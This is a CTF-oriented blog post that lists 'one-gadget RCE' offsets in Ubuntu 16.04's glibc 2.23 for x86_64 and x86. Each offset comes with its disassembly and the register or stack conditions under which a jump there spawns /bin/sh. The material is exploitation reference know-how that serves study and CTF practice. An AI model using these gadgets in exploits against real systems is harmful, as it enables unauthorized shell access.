---
category: blog
layout: post
date: "2016-09-16T17:13:37+09:00"
title: "one-gadget RCE in Ubuntu 16.04 libc"
tags: [ "ctf", "pwn", "libc", "shell", "one-gadget-rce" ]
---

In libc, there are `execve("/bin/sh", NULL, NULL)` gadgets.
There is the document of Dragon Sector: <http://j00ru.vexillium.org/?p=2485>.

But I couldn't find documents about the concrete values of them.
So I write them (of both x86\_64 and x86) and their preconditions here.

---

## Ubuntu 16.04, x86_64

``` sh
$ md5sum /lib/x86_64-linux-gnu/libc.so.6
d443f227870b9c29182cc7a7a007d881  /lib/x86_64-linux-gnu/libc.so.6

$ /lib/x86_64-linux-gnu/libc.so.6
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu3) stable release version 2.23, by Roland McGrath et al.
Copyright (C) 2016 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 5.3.1 20160413.
Available extensions:
	crypt add-on version 2.1 by Michael Glad and others
	GNU Libidn by Simon Josefsson
	Native POSIX Threads Library by Ulrich Drepper et al
	BIND-8.2.3-T5B
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
```

### 0x4525a

-   `[rsp+0x30] = NULL`

``` asm
000000000004525a <__strtold_nan@@GLIBC_PRIVATE+1258>:
  4525a:	48 8b 05 57 dc 37 00 	mov    rax,QWORD PTR [rip+0x37dc57]        # 3c2eb8 <environ>
  45261:	48 8d 3d 23 73 14 00 	lea    rdi,[rip+0x147323]        # 18c58b "/bin/sh"
  45268:	48 8d 74 24 30       	lea    rsi,[rsp+0x30]
  4526d:	c7 05 29 02 38 00 00 	mov    DWORD PTR [rip+0x380229],0x0        # 3c54a0 <__abort_msg@@GLIBC_PRIVATE+0x8c0>
  45274:	00 00 00 
  45277:	c7 05 23 02 38 00 00 	mov    DWORD PTR [rip+0x380223],0x0        # 3c54a4 <__abort_msg@@GLIBC_PRIVATE+0x8c4>
  4527e:	00 00 00 
  45281:	48 8b 10             	mov    rdx,QWORD PTR [rax]
  execve
  45284:	e8 67 6a 08 00       	call   cbcf0 <execve@@GLIBC_2.2.5>
```

### 0xef9f4

-   `[rsp+0x50] = NULL`

``` asm
00000000000ef9f4 <gai_strerror@@GLIBC_2.2.5+2420>:
  ef9f4:	48 8b 05 bd 34 2d 00 	mov    rax,QWORD PTR [rip+0x2d34bd]        # 3c2eb8 <environ>
  ef9fb:	48 8d 74 24 50       	lea    rsi,[rsp+0x50]
  efa00:	48 8d 3d 84 cb 09 00 	lea    rdi,[rip+0x9cb84]        # 18c58b "/bin/sh"
  efa07:	48 8b 10             	mov    rdx,QWORD PTR [rax]
  efa0a:	e8 e1 c2 fd ff       	call   cbcf0 <execve@@GLIBC_2.2.5>
```

### 0xf0897

-   `[rsp+0x70] = NULL`

``` asm
00000000000f0897 <gai_strerror@@GLIBC_2.2.5+6167>:
   f0897:	48 8b 05 1a 26 2d 00 	mov    rax,QWORD PTR [rip+0x2d261a]        # 3c2eb8 <environ>
   f089e:	48 8d 74 24 70       	lea    rsi,[rsp+0x70]
   f08a3:	48 8d 3d e1 bc 09 00 	lea    rdi,[rip+0x9bce1]        # 18c58b "/bin/sh"
   f08aa:	48 8b 10             	mov    rdx,QWORD PTR [rax]
   f08ad:	e8 3e b4 fd ff       	call   cbcf0 <execve@@GLIBC_2.2.5>
```

### 0xf5e40

-   `[rbp-0xf8] = NULL`

``` asm
00000000000f5e40 <posix_spawnp@@GLIBC_2.15+1888>:
   f5e40:	48 8d 3d 44 67 09 00 	lea    rdi,[rip+0x96744]        # 18c58b "/bin/sh"
   f5e47:	eb bc                	jmp    f5e05 <posix_spawnp@@GLIBC_2.15+0x725>
00000000000f5e05 <posix_spawnp@@GLIBC_2.15+0x725>:
   f5e05:	48 8b 95 08 ff ff ff 	mov    rdx,QWORD PTR [rbp-0xf8]
   f5e0c:	48 89 ce             	mov    rsi,rcx      # should be NULL
   f5e0f:	e8 dc 5e fd ff       	call   cbcf0 <execve@@GLIBC_2.2.5>
```

### 0xcc673

-   `rcx = NULL`
-   `r12 = NULL`

``` asm

00000000000cc673 <execvpe@@GLIBC_2.11+915>:
   cc673:	48 8d 3d 11 ff 0b 00 	lea    rdi,[rip+0xbff11]        # 18c58b "/bin/sh"
   cc67a:	e9 81 fd ff ff       	jmp    cc400 <execvpe@@GLIBC_2.11+0x120>
00000000000cc400 <execvpe@@GLIBC_2.11+0x120>:
   cc400:	4c 89 e2             	mov    rdx,r12
   cc403:	48 89 ce             	mov    rsi,rcx
   cc406:	e8 e5 f8 ff ff       	call   cbcf0 <execve@@GLIBC_2.2.5>
```

### 0xcc748

-   `rax = NULL`
-   `r12 = NULL`

``` asm
00000000000cc748 <execvpe@@GLIBC_2.11+1128>:
   cc748:	48 8d 3d 3c fe 0b 00 	lea    rdi,[rip+0xbfe3c]        # 18c58b "/bin/sh"
   cc74f:	48 89 c6             	mov    rsi,rax
   cc752:	e9 38 fe ff ff       	jmp    cc58f <execvpe@@GLIBC_2.11+0x2af>
00000000000cc58f <execvpe@@GLIBC_2.11+0x2af>:
   cc58f:	4c 89 e2             	mov    rdx,r12
   cc592:	e8 59 f7 ff ff       	call   cbcf0 <execve@@GLIBC_2.2.5>
```

---

## Ubuntu 16.04, x86

``` sh
$ md5sum /lib/i386-linux-gnu/libc.so.6
fc751657457c0420d5e07d4c905bdc34  /lib/i386-linux-gnu/libc.so.6

$ /lib/i386-linux-gnu/libc.so.6
GNU C Library (Ubuntu GLIBC 2.23-0ubuntu3) stable release version 2.23, by Roland McGrath et al.
Copyright (C) 2016 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 5.3.1 20160413.
Available extensions:
	crypt add-on version 2.1 by Michael Glad and others
	GNU Libidn by Simon Josefsson
	Native POSIX Threads Library by Ulrich Drepper et al
	BIND-8.2.3-T5B
libc ABIs: UNIQUE IFUNC
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
```

### memo

In the libc, the `esi` register is used to have the address of the `rw-p` area of libc (`0xf7faa000` in below example).
This is used as a base address, so you must set this correct to use one-gadget RCE.
Buf fortunately, `esi` is not required to be preserved, so you can get this only to call a function in libc.

``` asm
gdb-peda$ vmmap
Start      End        Perm      Name
0x08048000 0x08049000 r-xp      /home/user/a.out
0x08049000 0x0804a000 r--p      /home/user/a.out
0x0804a000 0x0804b000 rw-p      /home/user/a.out
0xf7df8000 0xf7fa7000 r-xp      /lib/i386-linux-gnu/libc-2.23.so
0xf7fa7000 0xf7fa8000 ---p      /lib/i386-linux-gnu/libc-2.23.so
0xf7fa8000 0xf7faa000 r--p      /lib/i386-linux-gnu/libc-2.23.so
0xf7faa000 0xf7fab000 rw-p      /lib/i386-linux-gnu/libc-2.23.so
0xf7fab000 0xf7fae000 rw-p      mapped
0xf7fd4000 0xf7fd6000 rw-p      mapped
0xf7fd6000 0xf7fd8000 r--p      [vvar]
0xf7fd8000 0xf7fd9000 r-xp      [vdso]
0xf7fd9000 0xf7ffb000 r-xp      /lib/i386-linux-gnu/ld-2.23.so
0xf7ffb000 0xf7ffc000 rw-p      mapped
0xf7ffc000 0xf7ffd000 r--p      /lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 rw-p      /lib/i386-linux-gnu/ld-2.23.so
0xfffdc000 0xffffe000 rw-p      [stack]
```

`/bin/sh` is at the `0x18c58b`.

``` sh
$ strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
 18c58b /bin/sh
```

So the string `/bin/sh` often appears as `esi-0x565c1`, and `sh` does as `esi-0x565bc`.

### 0x5fa9e, 0x12058c

-   `esi` is the address of `rw-p` area of libc
-   `eax = NULL`

``` asm
0005fa9e <_IO_proc_open@@GLIBC_2.1+766>:
   5fa9e:	50                   	push   eax
   5fa9f:	8d 86 44 9a fa ff    	lea    eax,[esi-0x565bc] ; "sh"
   5faa5:	50                   	push   eax
   5faa6:	8d 86 3f 9a fa ff    	lea    eax,[esi-0x565c1] ; "/bin/sh"
   5faac:	50                   	push   eax
   5faad:	e8 ee 0e 05 00       	call   b09a0 <execl@@GLIBC_2.0>
```

``` asm
0012058c <_IO_proc_open@GLIBC_2.0+684>:
  12058c:	50                   	push   eax
  12058d:	8d 86 44 9a fa ff    	lea    eax,[esi-0x565bc] ; "sh"
  120593:	50                   	push   eax
  120594:	8d 86 3f 9a fa ff    	lea    eax,[esi-0x565c1] ; "/bin/sh"
  12059a:	50                   	push   eax
  12059b:	e8 00 04 f9 ff       	call   b09a0 <execl@@GLIBC_2.0>
```


### 0x3ac49

-   `esi` is the address of `rw-p` area of libc
-   `[esp+0x34] = NULL`

``` asm
0003ac49 <__strtold_nan@@GLIBC_PRIVATE+1241>:
   3ac49:	8b 86 48 ff ff ff    	mov    eax,DWORD PTR [esi-0xb8] ; <environ>
   3ac4f:	83 c4 0c             	add    esp,0xc
   3ac52:	c7 86 20 16 00 00 00 	mov    DWORD PTR [esi+0x1620],0x0
   3ac59:	00 00 00 
   3ac5c:	c7 86 24 16 00 00 00 	mov    DWORD PTR [esi+0x1624],0x0
   3ac63:	00 00 00 
   3ac66:	ff 30                	push   DWORD PTR [eax]
   3ac68:	8d 44 24 2c          	lea    eax,[esp+0x2c]
   3ac6c:	50                   	push   eax
   3ac6d:	8d 86 3f 9a fa ff    	lea    eax,[esi-0x565c1] ; /bin/sh
   3ac73:	50                   	push   eax
   3ac74:	e8 87 5a 07 00       	call   b0700 <execve@@GLIBC_2.0>
```

### 0xb0d5a

-   `ebx` is the address of `rw-p` area of libc
-   `[ebp+0x8] = NULL`
-   `esi = 1`

or

-   `ebx` is the address of `rw-p` area of libc
-   `[ebp+0x8] = NULL`
-   `esi` is $\gt 1$
-   `edi` is an address of readable array with length `esi` $- 1$

``` asm
000b0d5a <execvpe@@GLIBC_2.11+202>:
   b0d5a:	8d 44 24 0f          	lea    eax,[esp+0xf]
   b0d5e:	83 e0 f0             	and    eax,0xfffffff0
   b0d61:	8d 93 3f 9a fa ff    	lea    edx,[ebx-0x565c1] ; "/bin/sh"
   b0d67:	83 fe 01             	cmp    esi,0x1
   b0d6a:	89 55 e4             	mov    DWORD PTR [ebp-0x1c],edx
   b0d6d:	89 10                	mov    DWORD PTR [eax],edx
   b0d6f:	8b 55 08             	mov    edx,DWORD PTR [ebp+0x8]
   b0d72:	89 50 04             	mov    DWORD PTR [eax+0x4],edx
   b0d75:	0f 84 c4 02 00 00    	je     b103f <execvpe@@GLIBC_2.11+0x3af>

   b0d7b:	90                   	nop
   b0d7c:	8d 74 26 00          	lea    esi,[esi+eiz*1+0x0]
   b0d80:	8b 54 b7 fc          	mov    edx,DWORD PTR [edi+esi*4-0x4]
   b0d84:	89 14 b0             	mov    DWORD PTR [eax+esi*4],edx
   b0d87:	83 ee 01             	sub    esi,0x1
   b0d8a:	83 fe 01             	cmp    esi,0x1
   b0d8d:	75 f1                	jne    b0d80 <execvpe@@GLIBC_2.11+0xf0>
   b0d8f:	8b 10                	mov    edx,DWORD PTR [eax]

   b0d91:	83 ec 04             	sub    esp,0x4
   b0d94:	ff 75 10             	push   DWORD PTR [ebp+0x10]
   b0d97:	89 4d e4             	mov    DWORD PTR [ebp-0x1c],ecx
   b0d9a:	50                   	push   eax
   b0d9b:	52                   	push   edx
   b0d9c:	e8 5f f9 ff ff       	call   b0700 <execve@@GLIBC_2.0>

   b103f:	8b 55 e4             	mov    edx,DWORD PTR [ebp-0x1c]
   b1042:	e9 4a fd ff ff       	jmp    b0d91 <execvpe@@GLIBC_2.11+0x101>
```

---

-   Tue Sep 20 02:27:06 JST 2016
    -   the gadgets of x86 are added.
